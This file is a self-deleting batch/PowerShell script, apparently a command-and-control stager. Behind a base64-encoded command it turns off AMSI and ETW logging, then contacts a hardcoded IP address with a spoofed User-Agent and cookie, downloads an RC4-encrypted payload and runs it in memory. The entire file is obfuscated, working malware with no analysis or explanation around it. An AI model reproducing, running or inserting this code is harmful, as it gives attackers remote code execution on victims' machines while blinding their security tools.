# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAcwBJAG8AbgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAcwBJAG8ATgAuAE0AQQBqAG8AUgAgAC0AZwBFACAAMwApAHsAJABSAGUARgA9AFsAUgBFAEYAXQAuAEEAcwBTAGUAbQBiAGwAWQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAEUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATABVAEUAKAAkAE4AdQBMAEwALAAkAHQAUgBVAEUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAG0AXwBlACcAKwAnAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuACcAKwAnAFAAdQBiAGwAaQBjACwAJwArACcASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQAnACsAJwBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAJwArACcAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAGUAdAAnACsAJwB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgAnACsAJwBsAGkAYwAsAFMAJwArACcAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAEUAdAAuAFMAZQByAFYAaQBjAGUAUABPAGkAbgB0AE0AQQBOAEEARwBlAFIAXQA6ADoARQB4AFAARQBjAHQAMQAwADAAQwBPAE4AVABJAE4AVQBFAD0AMAA7ACQAQgAzADkAMAA0AD0ATgBlAFcALQBPAEIASgBlAGMAdAAgAFMAeQBzAFQARQBtAC4ATgBFAHQALgBXAGUAYgBDAGwASQBlAE4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAFgAdAAuAEUATgBDAE8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABFAC4ARwBFAHQAUwBUAHIASQBuAGcAKABbAEMATwBuAHYARQByAFQAXQA6ADoARgBSAG8ATQBCAGEAcwBlADYANABTAFQAcgBJAE4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATABnAEEANABBAEMANABBAE0AZwBBADEAQQBEAE0AQQBMAGcAQQB5AEEARABJAEEATQBRAEEANgBBAEQAVQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAYgAzADkAMAA0AC4ASABlAGEAZABFAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgAzADkAMAA0AC4AUABSAG8AeABZAD0AWwBTAFkAcwBUAGUATQAuAE4AZQB0AC4AVwBlAEIAUgBlAFEAVQBFAFMAdABdADoAOgBEAGUARgBBAFUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQAQgAzADkAMAA0AC4AUAByAG8AeAB5AC4AQwByAEUARABlAG4AVABpAEEAbABzACAAPQAgAFsAUwBZAHMAdABFAG0ALgBOAEUAdAAuAEMAcgBFAGQAZQBuAFQASQBhAGwAQwBhAGMAaABFAF0AOgA6AEQAZQBGAGEAVQBsAFQATgBFAHQAVwBPAFIASwBDAHIAZQBEAEUAbgB0AGkAQQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAYgAzADkAMAA0AC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQARQB4AHQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgB5AHQAZQBzACgAJwBlACUATQAyADUAQgBiAHMAUQBnAHYAdwBYAFsAaABsADsALQAsAHkAPABTAG4AMwBjADoAKgAjAF4AegBwACEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiADMAOQAwADQALgBIAEUAYQBEAEUAUgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHIAdQBtAEkARwBkAEcAdgBrAFMAYwA9AGIAagBiAEkAWgBrADQAOQBYAHUASgBXAGoAMgB1AGkAbABUAFoASABuAHkAbABNADMAagBnAD0AIgApADsAJABkAGEAdABhAD0AJABiADMAOQAwADQALgBEAG8AVwBuAGwAbwBBAGQARABBAHQAYQAoACQAcwBFAHIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAVABBAFsAMAAuAC4AMwBdADsAJABkAGEAVABBAD0AJABEAEEAVABBAFsANAAuAC4AJABEAGEAVABBAC4AbABlAE4AZwB0AGgAXQA7AC0ASgBvAGkATgBbAEMAaABhAFIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=